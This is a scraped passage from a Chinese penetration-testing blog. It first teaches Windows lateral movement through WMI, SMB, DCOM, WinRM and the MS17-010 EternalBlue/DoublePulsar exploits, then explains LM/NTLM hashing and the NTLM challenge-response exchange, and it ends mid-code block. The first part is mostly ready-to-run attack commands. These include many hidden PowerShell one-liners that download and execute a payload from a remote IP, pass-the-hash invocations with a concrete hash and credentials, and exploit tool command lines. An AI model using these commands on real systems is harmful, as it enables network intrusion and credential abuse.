hack\administrator admin@123 "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Invoke-WMlExec"><a href="#Invoke-WMlExec" class="headerlink" title="Invoke-WMlExec"></a>Invoke-WMlExec</h2><h3 id="Invoke-WMlExec是一个powershel脚本在Invoke-TheHash的文件中用法如下"><a href="#Invoke-WMlExec是一个powershel脚本在Invoke-TheHash的文件中用法如下" class="headerlink" title="Invoke-WMlExec是一个powershel脚本在Invoke TheHash的文件中用法如下"></a>Invoke-WMlExec是一个powershel脚本在Invoke TheHash的文件中用法如下</h3><pre class="line-numbers language-none"><code class="language-none">Invoke-WMIExec -Target IP -Domain 域 -Username 用户 -Hash hash -Command "calc.exe" -verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="采用无文件落地的方式进行横向"><a href="#采用无文件落地的方式进行横向" class="headerlink" title="采用无文件落地的方式进行横向"></a>采用无文件落地的方式进行横向</h3><pre class="line-numbers language-none"><code class="language-none">shell powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://47.120.13.249:8080/Invoke-WMIExec.ps1');import-module .\Invoke-WMIExec.ps1;Invoke-WMIExec -Target 192.168.70.16 -Domain hack -Username administrator -Hash 579da618cfbfa85247acf1f800a280a4 -Command "whoami" -verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><h4 id="1、导入脚本"><a href="#1、导入脚本" class="headerlink" title="1、导入脚本"></a>1、导入脚本</h4><pre class="line-numbers language-none"><code class="language-none">powershell-import powershell/Invoke-WMIExec.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2、运行上线命令"><a href="#2、运行上线命令" class="headerlink" title="2、运行上线命令"></a>2、运行上线命令</h4><pre class="line-numbers language-none"><code class="language-none">powershell Invoke-WMIExec -Target 192.168.70.16 -Domain hack -Username administrator -Hash 579da618cfbfa85247acf1f800a280a4 -Command "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))" -verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Invoke-WMIMethod-ps1"><a href="#Invoke-WMIMethod-ps1" class="headerlink" title="Invoke-WMIMethod.ps1"></a>Invoke-WMIMethod.ps1</h2><p>该模块为Powershell内置模块，以下为示例，可以自由组合命令进行测试。</p><pre class="line-numbers language-none"><code class="language-none">$User                  #目标系统用户名$Password              #目标系统密码$Cred                  #账号密码整合，导入CredentialInvoke- WMIMethod      #远程运行指定程序#####----------------------------#####$User ="administrator" $Password= ConvertTo-SecureString -String “admin@123" -AsPlainText -Force $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User ,$Password Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))" -ComputerName "192.168.70.16" -Credential $Cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="smb远程执行命令横向移动"><a href="#smb远程执行命令横向移动" class="headerlink" title="smb远程执行命令横向移动"></a>smb远程执行命令横向移动</h1><h2 id="SMB介绍"><a href="#SMB介绍" class="headerlink" title="SMB介绍"></a>SMB介绍</h2><p>SMB全称是Server Message Block翻译过来是服务器信息块，它也是一种客户端到服务器的通信协议。除此<br>之外，SMB协议也被称为请求-回复协议。客户端与服务器建立连接后,客户端可以向服务器发送SMB命令允许用<br>户访问共享、打开、读取或者是写入文件。</p><p><strong>利用条件:开启了445端口</strong></p><h2 id="smbexec使用"><a href="#smbexec使用" class="headerlink" title="smbexec使用"></a>smbexec使用</h2><p>smbexec为<strong>impacket</strong>工具中的工具,操作简单，容易被杀，使用时无需先进行IPC连接</p><pre class="line-numbers language-none"><code class="language-none">明文传递命令:smbexec hack.com/administrator:admin@123@192.168.70.16hash传递:smbexec -hashes :$HASH$ ./admin@192.168.70.16smbbexec -hashes :$HASH$ domain/admin@192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用明文"><a href="#使用明文" class="headerlink" title="使用明文"></a>使用明文</h3><h4 id="1、输入命令"><a href="#1、输入命令" class="headerlink" title="1、输入命令"></a>1、输入命令</h4><pre class="line-numbers language-none"><code class="language-none">smbexec.exe hack.com/administrator:admin@123@192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使用hash"><a href="#使用hash" class="headerlink" title="使用hash"></a>使用hash</h4><pre class="line-numbers language-none"><code class="language-none">smbexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 administrator@192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="DCOM远程执行命令横向移动"><a href="#DCOM远程执行命令横向移动" class="headerlink" title="DCOM远程执行命令横向移动"></a>DCOM远程执行命令横向移动</h1><h2 id="DCOM介绍"><a href="#DCOM介绍" class="headerlink" title="DCOM介绍"></a>DCOM介绍</h2><p><strong>DCOM (分布式组件对象模型)是微软的一系列概念和程序接口。它支持不同的两台机器上的组件间的通信,<br>不论它们是运行在局域网、广域网、还是Internet上。 利用这个接口，客户端程序对象能够向网络中另一台计算机<br>上的服务器程序对象发送请求,使用DCOM进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管<br>COM服务器端的软件</strong></p><h2 id="获取DCOM列表"><a href="#获取DCOM列表" class="headerlink" title="获取DCOM列表"></a>获取DCOM列表</h2><pre class="line-numbers language-none"><code class="language-none">Get-CimInstance Win32_DCOMApplicationGet-CimInstance -classWin32_DCOMApplication | select appid ,nameGet-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="DCOM横向前提"><a href="#DCOM横向前提" class="headerlink" title="DCOM横向前提"></a>DCOM横向前提</h2><pre class="line-numbers language-none"><code class="language-none">1、需要关闭系统防火墙2、必须拥有管理员权限3、在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><h3 id="MMC20-Application远程执行命令"><a href="#MMC20-Application远程执行命令" class="headerlink" title="MMC20.Application远程执行命令"></a>MMC20.Application远程执行命令</h3><p>1、通过PowerShell与DCOM进行远程交互，此外，我们只需要提供一个DCOM ProgID和一个IP地址，然后,<br>它就从远程返回一个COM对象的实例。</p><pre class="line-numbers language-none"><code class="language-none">$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、然后执行如下命令，我们就可以调用”ExecuteShellCommand”方法在远程主机上启动进程</p><pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$nu1l,"/c calc.exe","Minimzed")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、将IP和命令换成上线的命令</p><pre class="line-numbers language-none"><code class="language-none">[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.70.16")).Document.ActiveView.ExecuteShellCommand('cmd.exe' ,$null,"/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))" ,"Minimzed")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ShellWindows远程执行命令"><a href="#ShellWindows远程执行命令" class="headerlink" title="ShellWindows远程执行命令"></a>ShellWindows远程执行命令</h3><pre class="line-numbers language-none"><code class="language-none">[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', "127.0.0.1")).item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:windowssystem32",$nu11,0)   #打开 本地计算器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', "192.168.70.16")).item().Document.Application.ShellExecute("cmd.exe","/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))","c:windowssystem32",$null,0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ShellBrowserWindow远程执行命令"><a href="#ShellBrowserWindow远程执行命令" class="headerlink" title="ShellBrowserWindow远程执行命令"></a>ShellBrowserWindow远程执行命令</h3><p>适用于Windows 10和Windows Server 2012 R2等版本的系统。</p><pre class="line-numbers language-none"><code class="language-none">[activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "192.168.70.16")).Document.Application.shellExecute("cmd.exe", "/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))","c:windowssystem32",$nu1l,0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="调用Excel-Application远程执行命令"><a href="#调用Excel-Application远程执行命令" class="headerlink" title="调用Excel.Application远程执行命令"></a>调用Excel.Application远程执行命令</h3><p><strong>目标主机中安装有excle</strong></p><p><strong>1、通过PowerShell与DCOM进行远程交互， 创建Excel.Application对象的实例</strong></p><pre class="line-numbers language-none"><code class="language-none">$com = [activator]::CreateInstance([type]::GetTypeFromprogID(”Excel.Application","192.168.70.16"))$com.DisplayAlerts = $false$com = [activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","127.0.0.1"))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、然后执行如下命令，我们就可以调用该对象的”DDEInitiate’方法在远程主机上启动进程</strong></p><pre class="line-numbers language-none"><code class="language-none">$com.DDEInitiate("cmd.exe","/c 参数")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Visio-Application远程执行命令"><a href="#Visio-Application远程执行命令" class="headerlink" title="Visio.Application远程执行命令"></a>Visio.Application远程执行命令</h3><p><strong>目标主机中安装有Visio</strong></p><pre class="line-numbers language-none"><code class="language-none">[activator]::CreateInstance([type]::GetTypeFromProgID( "Visio.Application"，"192.168.70.16")).[0].Document.Application.shellExecute("C:shell.exe")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Outlook-Application远程执行命令"><a href="#Outlook-Application远程执行命令" class="headerlink" title="Outlook.Application远程执行命令"></a>Outlook.Application远程执行命令</h3><p><strong>目标主机中安装有Outlook</strong></p><pre class="line-numbers language-none"><code class="language-none">[activator]::CreateInstance([type]::GetTypeFromProgID("outlook.Application","192.168.70.16")).create0bject( "Shell.Application").shellExecute("C:shell.exe")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Impacket中的dcomexec-py"><a href="#Impacket中的dcomexec-py" class="headerlink" title="Impacket中的dcomexec.py"></a>Impacket中的dcomexec.py</h3><pre class="line-numbers language-none"><code class="language-none">dcomexec.exe [domain/]username:password@ip //创建一个交互式shelldcomexec.exe [domain/]username:password@ip command //执行命令dcomexec.exe [domain/]username:@ip -hashes [hash] //hash传递eg:dcomexec.exe hack/administrator:admin@123@192.168.70.16 "hostname"dcomexec.exe hack/administrator:admin@123@192.168.70.16 cmd /c "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="WinRM远程执行命令横向移动"><a href="#WinRM远程执行命令横向移动" class="headerlink" title="WinRM远程执行命令横向移动"></a>WinRM远程执行命令横向移动</h1><h2 id="WinRM介绍"><a href="#WinRM介绍" class="headerlink" title="WinRM介绍"></a>WinRM介绍</h2><p><strong>WinRM (Windows远程管理) 是Microsoft 在Windows中对WS-Management的实现，它使系统可以跨通用网络访问或交换管理信息。利用脚本对象或内置的命令行工具，WinRM可以与可能具有基板管理控制器(BMC)的任何远程计算机-起使用，以获取数据。也可以获取基于Windows的计算机 (包括WinRM).</strong></p><p><strong>WinRM默认端口5985 (HTTP端口)或5986 (HTTPS端口) ，若配置了WINRM远程服务,当我们拿到-一个管理员账户时，可以使用远程连接进行命令执行操作winrm通过HTTP (5985) 或HTTPS SOAP (5986) 端口来进行通信</strong></p><h2 id="winrs-exe"><a href="#winrs-exe" class="headerlink" title="winrs.exe"></a>winrs.exe</h2><pre class="line-numbers language-none"><code class="language-none">Winrs.exe是一个内置的命令行工具它允许远程命令的执行在WinRm的适当的有资格的用户winrs -r:http://127.0.0.1:5985 -u:administrator -p:Admin@123 "whoami"winrs -r:http://127.0.0.1:5985 -u:机器名\用户名 -p:xxxxx "ipconfig"winrs -r:https://127.0.0.1:5986 -u:机器名\用户名 -p:xxxXx "ipconfig"winrs -r:http://127.0.0.1:5985 -u:机器名\用户名 -p:xxxxx cmdwinrs -r:https://127.0.0.1:5986 -u:机器名\用户名 -p:xxxxx cmdInvoke-Command -ComputerName TARGET -ScriptBlock { dir c:\ }Invoke-Command -ComputerName TARGET -Credential 域名\用户名-command {Get-Cu1ture}Invoke-Command -ComputerName TARGET -Credential 域名\用户名-ScriptB1ock {Get-Cu1ture}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-执行"><a href="#1-执行" class="headerlink" title="1.执行"></a>1.执行</h3><pre class="line-numbers language-none"><code class="language-none">winrs -r:http://192.168.70.16:5985 -u:administrator -p:admin@123 "whoami"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">如果出现提示:winrs error:winRM 客户端无法处理该请求。可以在 下列条件下将默认身份验证与IP地址结合使用:传输为HTTPS或目标位于TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置TrustedHosts. 请注意，TrustedHosts列表中的计算机可能未经过身份验证。有 关如何设置TrustedHosts 的详细信息，请运行以下命令：winrm help config。允许所有客户端ip连接:Winrm set winrm/config/Client @{TrustedHosts="*"}手动开启winrswinrs quickconfig -q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-执行上线命令"><a href="#2-执行上线命令" class="headerlink" title="2.执行上线命令"></a>2.执行上线命令</h3><pre class="line-numbers language-none"><code class="language-none">winrs -r:http://192.168.70.16:5985 -u:administrator -p:admin@123 cmd /c "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://47.120.13.249:8080/payload.ps1'))"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="cs自带"><a href="#cs自带" class="headerlink" title="cs自带"></a>cs自带</h2><p>winrm,使用域管理员身份</p><p><img src="assets/image-20230410150023496.png" alt="image-20230410150023496"></p><h1 id="使用系统漏洞ms17010横向移动"><a href="#使用系统漏洞ms17010横向移动" class="headerlink" title="使用系统漏洞ms17010横向移动"></a>使用系统漏洞ms17010横向移动</h1><h2 id="Cobalt-Strike生成DLL"><a href="#Cobalt-Strike生成DLL" class="headerlink" title="Cobalt Strike生成DLL"></a>Cobalt Strike生成DLL</h2><h3 id="1、生成CS的生成bin文件"><a href="#1、生成CS的生成bin文件" class="headerlink" title="1、生成CS的生成bin文件"></a>1、生成CS的生成bin文件</h3><p><img src="assets/image-20230410151037984.png" alt="image-20230410151037984"></p><h3 id="2-使用msf用bin文件生成dll文件"><a href="#2-使用msf用bin文件生成dll文件" class="headerlink" title="2.使用msf用bin文件生成dll文件"></a>2.使用msf用bin文件生成dll文件</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -p generic/custom PAYLOADFILE=./pay1oad.bin -a x64 --platform windows -f d11 -o wanli.d11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230410151052771.png" alt="image-20230410151052771"></p><h3 id="3-或者直接生成也行"><a href="#3-或者直接生成也行" class="headerlink" title="3.或者直接生成也行"></a>3.或者直接生成也行</h3><p><img src="assets/image-20230410151354573.png" alt="image-20230410151354573"></p><h2 id="原生ms17-010渗透"><a href="#原生ms17-010渗透" class="headerlink" title="原生ms17-010渗透"></a>原生ms17-010渗透</h2><h3 id="1、CS执行下面的命令-win7"><a href="#1、CS执行下面的命令-win7" class="headerlink" title="1、CS执行下面的命令-win7"></a>1、CS执行下面的命令-win7</h3><pre class="line-numbers language-none"><code class="language-none">Eternalblue-2.2.0.exe --TargetIp 192.168.70.16 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --verifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomA11ocations 12 --0utconfig out1og.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230410160210177.png" alt="image-20230410160210177"></p><h3 id="2、上线-利用生成的1111-dll"><a href="#2、上线-利用生成的1111-dll" class="headerlink" title="2、上线-利用生成的1111.dll"></a>2、上线-利用生成的1111.dll</h3><pre class="line-numbers language-none"><code class="language-none">Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xm1 --TargetIp 192.168.70.16 --TargetPort 445 --Protoco1 SMB --Architecture x64 --Function RUNDLL --D11Pay1oad 1111.dll --payloadD1lordinal 1 --ProcessName 1sass.exe --ProcessComnandLine "" --NetworkTimeout 60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/29-nei-wang-shen-tou/di-3-zhang-windows-ren-zheng-he-mi-ma-de-zhua-qu/di-3-zhang-windows-ren-zheng-he-mi-ma-de-zhua-qu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/29-nei-wang-shen-tou/di-3-zhang-windows-ren-zheng-he-mi-ma-de-zhua-qu/di-3-zhang-windows-ren-zheng-he-mi-ma-de-zhua-qu/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows认证和密码抓取概述"><a href="#Windows认证和密码抓取概述" class="headerlink" title="Windows认证和密码抓取概述"></a>Windows认证和密码抓取概述</h1><h2 id="Windows认证"><a href="#Windows认证" class="headerlink" title="Windows认证"></a>Windows认证</h2><ol><li>本地认证 </li><li>网络认证 </li><li>域认证</li></ol><h2 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h2><ol><li>SAM文件 </li><li>Lsass.exe</li></ol><h1 id="Windwso本地认证之NTML哈希和LM哈希"><a href="#Windwso本地认证之NTML哈希和LM哈希" class="headerlink" title="Windwso本地认证之NTML哈希和LM哈希"></a>Windwso本地认证之NTML哈希和LM哈希</h1><h2 id="本地认证的流程"><a href="#本地认证的流程" class="headerlink" title="本地认证的流程"></a>本地认证的流程</h2><p>Windows的登陆密码是储存在系统本地的SAM文件中的，在登陆Windows的时候，系统会将用户输入的密码与 SAM文件中的密码进行对比，如果相同，则认证成功 </p><p>SAM文件是位于 <code>%SystemRoot%\system32\config\</code> 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表 着你可以随意去查看系统密码。</p><p><img src="assets/image-20230126152644850.png" alt="image-20230126152644850"></p><p>Windows本地认证流程如下：</p><p><img src="assets/image-20230130162947177.png" alt="image-20230130162947177"></p><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面，也就是输入框界面，接收用户的输入 信息后，将密码交给lsass进程，这个过程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库进 行比较认证 Windows Logon Process（即winlogon.exe）：是Windows NT 用户登陆程序，用于管理用户登陆和退出 LSASS：用于微软Windows系统的安全机制，它用于本地安全和登陆策略 本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p><h2 id="LM和NTML哈希"><a href="#LM和NTML哈希" class="headerlink" title="LM和NTML哈希"></a>LM和NTML哈希</h2><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中,用户信息存储在<code>ntds.dit</code>中,加 密后为散列值。 Windows操作系统中的密码一般由两部分组成,一部分为 LM Hash,另一部分为NTLMHash。在 Windows操作系统中,Hash的结构通常如下</p><pre class="line-numbers language-none"><code class="language-none">username:RID:LM‐HASH:NT‐HASH<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>LM Hash的全名为”LAN Manager Hash”,是微软为了提高 Windows操作系统的安全性而采 用的散列加密算法,其本 质是DES加密。尽管 LM Hash较容易被破解,但为了保证系统的兼容性, Windows只是将LM Hash禁用了(从 Windows vista和 Windows Server2008版本开始, Windows操作系统默认禁用 LM Hash)。 LM Hash明文密码被 限定在14位以内,也就是说,如果要停止使用 LM Hash,将用 户的密码设置为14位以上即可。如果 LM Hash被禁用了, 攻击者通过工具抓取的 LM Hash通常 为“ad3b435b51404eead3b435b51404ee”(表示 LM Hash为空值或被禁用) NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 NTLM Hash 是基于MD4加密算 username:RID:LM‐HASH:NT‐HASH 法进行加密的。个人版从 Windows vista以后,服务器版从 Windows Server 2003以后, Windows操作系统的认证方 式均为 NTLM Hash </p><p>为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协 议。下面是各个版本对LM和NTLM的支持。</p><p><img src="assets/image-20230130163118145.png" alt="image-20230130163118145"></p><h2 id="LM-Hash原理"><a href="#LM-Hash原理" class="headerlink" title="LM Hash原理"></a>LM Hash原理</h2><p>1、将明文口令转换为其<em>大写</em>形式 假设这里以明文<code>Admin@123</code>为例，转换为大写格式为：<code>ADMIN@123</code> </p><p>2、 将字 符串大写后转换为<em>16进制字符串转换</em>后为 <code>41 44 4D 49 4E 40 31 32 33</code> </p><p>3、密码不足<em>14字节</em>要求用<em>0补全</em>， 1Byte=8bit,上面的16进制字符串共9个字节,还差5个字节 我么使用 00 00 00 00 00 补全为 41 44 4D 49 4E 40 31 32 33 00 00 00 00 00 </p><p>4、将上述编码分成<em>2组7字节</em></p><pre class="line-numbers language-none"><code class="language-none">41 44 4D 49 4E 40 31 第一组32 33 00 00 00 00 00 第二组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5、将每一组7字节的十六进制转换为<em>二进制</em>，每7bit一组<em>末尾加0</em>，再转换成<em>十六进制</em>组成得到2组8字节的编码 </p><p>第 一组</p><pre class="line-numbers language-none"><code class="language-none">16进制：41 44 4D 49 4E 40 31转换为二进制：01000001010001000100110101001001010011100100000000110001七个为一组末尾补0100000010100010000100101010100010010100011100100000000001100010合并后为0100000010100010000100101010100010010100011100100000000001100010在转换为16进制：40A212A894720062<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二组</p><pre class="line-numbers language-none"><code class="language-none">16进制：32 33 00 00 00 00 00转换为二进制：00110010001100110000000000000000000000000000000000000000七个为一组末尾补0011001000011000110000000000000000000000000000000000000000000000合并后为0011001000011000110000000000000000000000000000000000000000000000在转换为16进制：3218C00000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6、将以上步骤得到的两组8字节编码，分别<em>作为DES加密key</em>为魔术字符串 <code>KGS!@#$%</code> 进行加密 KGS!@#$%的16进 制为 <code>4B47532140232425</code></p><pre class="line-numbers language-none"><code class="language-none">第一组：6F08D7B306B1DAD4第二组：B75E0C8D76954A50<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230130163318739.png" alt="image-20230130163318739"></p><p>7、最终结果拼接即可<code>6F08D7B306B1DAD4B75E0C8D76954A50</code></p><h2 id="NTLM-Hash原理"><a href="#NTLM-Hash原理" class="headerlink" title="NTLM Hash原理"></a>NTLM Hash原理</h2><p>将明文口令<em>转换成十六进制</em>的格式 如：Admin@123 转换成<em>Unicode格式</em>，即在每个字节之后添加0x00</p><pre class="line-numbers language-none"><code class="language-none">Admin@123转16进制 41646D696E40313233添加00：410064006D0069006E004000310032003300<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>对Unicode字符串作<em>MD4加密</em>，生成32位的十六进制数字串 <code>570a9a65db8fba761c1008a51d4c95ab</code></p><p><img src="assets/image-20230130163437018.png" alt="image-20230130163437018"></p><h1 id="Windows网络认证之基于挑战响应认证的NTLM-协议"><a href="#Windows网络认证之基于挑战响应认证的NTLM-协议" class="headerlink" title="Windows网络认证之基于挑战响应认证的NTLM 协议"></a>Windows网络认证之基于挑战响应认证的NTLM 协议</h1><h2 id="网络认证NTLM协议简介"><a href="#网络认证NTLM协议简介" class="headerlink" title="网络认证NTLM协议简介"></a>网络认证NTLM协议简介</h2><p>在平时的测试中，经常会碰到处于工作组的计算机，处于工作组的计算机之间是无法建立一个可信的信托机构的， 只能是点对点进行信息的传输。举个例子就是，主机A想要访问主机B上的资源，就要向主机B发送一个存在于主机 B上的一个账户，主机B接收以后会在本地进行验证，如果验证成功，才会允许主机A进行相应的访问。</p><p>NTLM 协议是一种基于 <code>挑战（Chalenge）/响应（Response）</code> 认证机制，仅支持Windows的网络认证协议。</p><p> 它主要分为协商、质询和验证三个步骤：</p><pre class="line-numbers language-none"><code class="language-none">协商，这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的版本等各种信息。质询，这一步便是Chalenge/Response认证机制的关键之处，下面会介绍这里的步骤。验证，对质询的最后结果进行一个验证，验证通过后，即允许访问资源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><h3 id="认证成功"><a href="#认证成功" class="headerlink" title="认证成功"></a>认证成功</h3><p>1、首先，client会向server发送一个username，这个username是存在于server上的一个用户</p><p><img src="assets/image-20230130163927758.png" alt="image-20230130163927758"></p><p>2、首先会在本地查询是否存在这样的一个用户，如果存在，将会生成一个16位的随机字符，即<em>Chalenge</em>，然后用 查询到的这个user的<em>NTLM hash</em>对Chalenge进行加密，生成Chalenge1，将Chalenge1存储在本地，并将 Chalenge传给client。</p><p><img src="assets/image-20230130163943060.png" alt="image-20230130163943060"></p><p>3、当client接收到Chalenge时，将发送的username所对应的NTLM hash对Chalenge进行加密即<em>Response</em>，并 Response发送给server。</p><p><img src="assets/image-20230130164004463.png" alt="image-20230130164004463"></p><p>4、server在收到Response后，将其与Chalenge1进行<em>比较</em>，如果相同，则验证成功</p><p><img src="assets/image-20230130164024407.png" alt="image-20230130164024407"></p><h3 id="认证失败"><a href="#认证失败" class="headerlink" title="认证失败"></a>认证失败</h3><p>1、首先，client会向server发送一个username，这个username是存在于server上的一个用户</p><p><img src="assets/image-20230130164044712.png" alt="image-20230130164044712"></p><p>2、当server接收到这个信息时，首先会在本地查询是否存在这样的一个用户，如果不存在，则直接返回认证失败</p><p><img src="assets/image-20230130164100718.png" alt="image-20230130164100718"></p><h2 id="NTLM协议v1和v2区别"><a href="#NTLM协议v1和v2区别" class="headerlink" title="NTLM协议v1和v2区别"></a>NTLM协议v1和v2区别</h2><p>NTLM V2协议，NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是 NTLM Hash，</p><pre class="line-numbers language-none"><code class="language-none">NTLM v1的Challenge有8位，NTLM v1的主要加密算法是DESNTLM v2的Challenge为16位；NTLM v2的主要加密算法是HMAC‐MD5。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>1、实验环境如下</p><table><thead><tr><th>机器名称</th><th>IP地址</th><th>账号密码</th></tr></thead><tbody><tr><td>实验机器（windows 10）</td><td>192.168.41.132</td><td>自己的</td></tr><tr><td>靶机（windows server 2008 ）</td><td>192.168.41.130</td><td>kkk/Admin@123</td></tr></tbody></table><p>2、windows 10 上 已经安装了 wireshark</p><p><img src="assets/image-20230130164331183.png" alt="image-20230130164331183"></p><p>3、使用如下命令进行远程连接，并且使用wireshark 包</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.70.14 /u:mb 123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230130164403344.png" alt="image-20230130164403344"></p><p>4、前5个数据包中前四条时协商，第五个是认证的第一个数据包</p><p><img src="assets/image-20230130164417314.png" alt="image-20230130164417314"></p><p>5、第6个数据包就是返回chalenge挑战值</p><p><img src="assets/image-20230130164437933.png" alt="image-20230130164437933"></p><p>分析该数据包得到chalenge值 <code>53fb7eb8d40cc777</code></p><p><img src="assets/image-20230130164503537.png" alt="image-20230130164503537"></p><p>6、第7个数据包就是返回response的数据包</p><p>rsponse数据如下：</p><pre class="line-numbers language-none"><code 